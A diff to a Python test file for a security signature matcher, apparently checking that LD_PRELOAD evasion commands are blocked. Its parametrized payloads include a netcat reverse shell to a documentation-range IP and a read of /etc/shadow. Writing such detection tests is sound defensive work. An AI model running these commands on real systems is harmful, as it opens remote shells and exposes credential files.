@@ -11,6 +11,9 @@ from utils.security.signature_match import check_signature
 
 from .conftest import any_layer_blocks, deny_blocks
 
+# RFC 5737 documentation-range IP used in test payloads (not a real host).
+_TEST_IP = "198.51.100.1"
+
 
 # ---------------------------------------------------------------------------
 # 1. LD_PRELOAD — signature matcher (L2)
@@ -92,7 +95,7 @@ class TestLdPreloadEvasionCombinations:
     @pytest.mark.parametrize("cmd", [
         "LD_PRELOAD=/evil.so cat /etc/shadow",
         "LD_PRELOAD=/hook.so ssh-keygen -t rsa",
-        "LD_PRELOAD=/intercept.so nc -e /bin/sh 10.0.0.1 4444",
+        f"LD_PRELOAD=/intercept.so nc -e /bin/sh {_TEST_IP} 4444",
     ])
     def test_ld_preload_combined_attacks(self, cmd):
         v = check_signature(cmd)
